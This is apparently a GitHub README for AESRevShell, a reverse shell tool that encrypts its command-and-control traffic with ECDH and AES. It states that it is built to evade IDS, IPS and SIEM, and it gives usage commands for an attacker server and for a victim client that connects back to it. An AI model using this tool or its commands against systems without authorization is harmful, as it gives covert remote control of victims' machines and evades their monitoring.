# AESRevShell
AESRevShell is a **secure reverse shell tool** that utilizes **Elliptic Curve Diffie-Hellman (ECDH)** for secure key exchange and **AES encryption (CBC mode)** to ensure encrypted communication between a client and a server. This project demonstrates a robust and secure way to establish a command execution environment, where commands issued by the server are securely transmitted to the client and executed, with responses being sent back in an encrypted format.

By leveraging **ECDH + HKDF** for key exchange and **AES encryption**, this tool is designed to bypass traditional security systems such as **Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), and Security Information and Event Management (SIEM)** systems, making it a powerful tool for penetration testing in environments with strict monitoring.

### **Key Features:**
- **ECDH Key Exchange:** Secure key exchange using Elliptic Curve Diffie-Hellman (ECDH) to prevent Man-in-the-Middle (MITM) attacks.
- **HKDF Key Derivation:** Derives a secure AES key and IV using HMAC-based Key Derivation Function (HKDF).
- **AES Encryption (CBC mode):** Encrypts all communication between the client and server.
- **Client-Server Architecture:** Reverse shell functionality with encrypted command execution.
- **Resistance to MITM:** ECDH ensures that even if an attacker intercepts the communication, they cannot decrypt the data.
- **Bypass of IDS/IPS/SIEM:** AES encryption hides the command and control traffic, making it difficult to detect by network monitoring systems.

### **How It Works:**
1. **Key Exchange:**
   - The server and client generate their own ECDH key pairs (private and public keys).
   - They exchange their public keys and compute a shared secret using ECDH.
   - The shared secret is used to derive a secure AES key and IV using HKDF.

2. **Encrypted Communication:**
   - All commands and responses are encrypted with AES in CBC mode.
   - The server sends encrypted commands to the client, which decrypts and executes them.
   - The client sends the encrypted output back to the server.

3. **Secure Execution:**
   - The client executes commands in a secure environment and returns the encrypted output to the server.

## **Demos**
![image](https://github.com/user-attachments/assets/2a1486f1-7dfb-44fd-b0a8-893816e6de6f)
![image](https://github.com/user-attachments/assets/ec125041-cbcd-435a-9949-00a60fe581c1)

## **Installation**
1. Install dependencies:
   ```bash
   sudo apt update && sudo apt install -y python3-pip
   python3 -m pip install --upgrade cryptography
   ```

2. Clone the repository:
   ```bash
   git clone https://github.com/OusCyb3rH4ck/AESRevShell
   cd AESRevShell
   ```

3. Make the scripts executable:
   ```bash
   chmod +x client.py server.py
   ```

## **Usage**

#### **Server (attacker):**
Start the server (attacker) with the desired IP and port:
```bash
./server.py -i 0.0.0.0 -p 443
```

#### **Client (victim):**
Connect the client (victim) to the server:
```bash
./client.py -s SERVER_IP -p PORT
```

### **Security Features**
- **ECDH Key Exchange:** Prevents MITM attacks by securely exchanging keys.
- **HKDF Key Derivation:** Ensures unique and secure AES keys for each session.
- **AES Encryption:** Encrypts all communication to protect against eavesdropping.
- **No Manual Key Sharing:** Keys are exchanged securely without manual intervention.

### **Disclaimer**
This tool is intended for **educational purposes** and **authorized penetration testing** only. Do not use it for malicious purposes. The authors are not responsible for any misuse of this tool.

### **Contributing**
Contributions are welcome! If you have any suggestions, improvements, or bug fixes, feel free to open an issue or submit a pull request.

### **Author**
- [OusCyb3rH4ck](https://github.com/OusCyb3rH4ck)
